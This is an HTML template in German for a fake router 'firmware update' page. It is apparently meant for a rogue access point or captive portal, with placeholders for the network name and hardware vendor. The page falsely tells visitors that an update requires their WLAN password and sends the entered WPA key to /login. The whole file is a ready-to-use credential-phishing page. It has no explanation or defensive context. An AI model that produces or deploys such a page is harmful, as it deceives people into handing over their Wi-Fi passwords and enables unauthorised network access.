<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netzwerk Authentifizierung</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #333; }
        .container { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 400px; width: 90%; text-align: center; border-top: 5px solid #0056b3; }
        h2 { margin-top: 0; color: #1a1a1a; font-size: 22px; }
        p { color: #666; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
        .vendor-tag { font-weight: bold; color: #0056b3; }
        input[type="text"] { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; transition: border-color 0.3s; }
        input[type="text"]:focus { outline: none; border-color: #0056b3; }
        button { background-color: #0056b3; color: white; border: none; padding: 14px 20px; width: 100%; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background-color 0.3s; }
        button:hover { background-color: #004494; }
        .footer { margin-top: 25px; font-size: 12px; color: #aaa; }
    </style>
</head>
<body>
    <div class="container">
        <h2>System-Update für {{SSID_NAME}}</h2>
        <p>Um die Sicherheit dieses Netzwerks zu gewährleisten, ist ein Firmware-Update für Ihre <span class="vendor-tag">{{VENDOR_NAME}}</span> Hardware erforderlich. Bitte autorisieren Sie den Vorgang mit dem aktuellen WLAN-Passwort.</p>
        <form action="/login" method="GET">
            <input type="text" name="wpa_key" placeholder="WPA Passwort eingeben" required autocomplete="off">
            <button type="submit">Update Autorisieren</button>
        </form>
        <div class="footer">Secure Network Operations &copy; 2024</div>
    </div>
</body>
</html>
